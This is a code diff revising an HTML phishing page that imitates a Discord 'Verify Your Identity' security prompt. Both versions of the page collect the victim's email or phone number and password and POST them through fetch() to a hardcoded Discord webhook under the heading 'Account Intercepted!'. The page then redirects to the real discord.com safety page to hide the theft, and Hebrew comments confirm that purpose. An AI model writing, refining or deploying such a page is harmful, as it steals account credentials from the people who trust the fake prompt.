@@ -2,62 +2,66 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Discord Support - Security Re-verification</title>
+    <title>Discord | Account Verification</title>
     <style>
-        body { background-color: #313338; color: white; font-family: 'gg sans', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: #2b2d31; padding: 40px; border-radius: 8px; width: 420px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
-        .logo { width: 130px; margin-bottom: 25px; }
-        h2 { font-size: 24px; margin-bottom: 10px; color: #f2f3f5; }
-        p { color: #b5bac1; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 4px; border: 1px solid #1e1f22; background: #1e1f22; color: white; box-sizing: border-box; font-size: 16px; }
-        input:focus { outline: 1px solid #5865f2; }
-        label { display: block; text-align: left; color: #b5bac1; font-size: 12px; font-weight: bold; margin-bottom: 8px; text-transform: uppercase; }
-        button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; transition: 0.2s; }
+        body { background-color: #313338; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'gg sans', sans-serif; color: white; }
+        .card { background: #2b2d31; padding: 32px; border-radius: 8px; width: 420px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
+        .logo { width: 130px; margin-bottom: 20px; }
+        h2 { font-size: 24px; margin-bottom: 8px; }
+        p { color: #b5bac1; font-size: 15px; margin-bottom: 24px; }
+        .input-box { text-align: left; margin-bottom: 20px; }
+        label { color: #b5bac1; font-size: 12px; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 8px; }
+        input { width: 100%; padding: 10px; background: #1e1f22; border: none; border-radius: 4px; color: white; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; transition: 0.2s; }
         button:hover { background: #4752c4; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://assets-global.website-files.com/6257adef93867e3d84058941/6257af399999999999999999_discord-logo-white.svg" class="logo" alt="Discord">
-        <h2>Security Re-verification</h2>
-        <p>Our systems detected a login attempt from an unrecognized device. Please re-enter your credentials to secure your account and terminate all other sessions.</p>
+    <div class="card">
+        <img src="https://assets-global.website-files.com/6257adef93867e3d84058941/6257af399999999999999999_discord-logo-white.svg" class="logo">
+        <h2>Verify Your Identity</h2>
+        <p>A suspicious login was detected. Please enter your account credentials to verify ownership and secure your sessions.</p>
         
-        <div style="text-align: left;">
+        <div class="input-box">
             <label>Email or Phone Number</label>
-            <input type="text" id="email" placeholder="email@example.com">
-            <label>Current Password</label>
-            <input type="password" id="pass" placeholder="••••••••">
+            <input type="text" id="user_mail">
+        </div>
+        <div class="input-box">
+            <label>Password</label>
+            <input type="password" id="user_pass">
         </div>
         
-        <button onclick="submit()">Verify & Secure Account</button>
+        <button onclick="submitData()">Secure Account</button>
     </div>
 
     <script>
-        async function submit() {
-            const e = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
+        async function submitData() {
+            const mail = document.getElementById('user_mail').value;
+            const pass = document.getElementById('user_pass').value;
             const webhook = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
 
-            if (e && p) {
+            if (mail && pass) {
+                // שליחה לדיסקורד שלך
                 await fetch(webhook, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🔱 **Target Verified (Data Captured)**",
-                            color: 15158332,
+                            title: "🔱 **Account Intercepted!**",
                             fields: [
-                                { name: "📧 Login", value: "`" + e + "`" },
-                                { name: "🔑 Password", value: "`" + p + "`" }
+                                { name: "📧 Email", value: "`" + mail + "`" },
+                                { name: "🔑 Password", value: "`" + pass + "`" }
                             ],
+                            color: 15158332,
                             timestamp: new Date().toISOString()
                         }]
                     })
                 });
-                // העברה לדף רשמי לאחר ה"אימות"
+                
+                // העברה לדיסקורד האמיתי רק אחרי השליחה
                 window.location.href = "https://discord.com/safety";
             } else {
-                alert("Please fill in all fields to proceed.");
+                alert("Please fill in all fields.");
             }
         }
     </script>
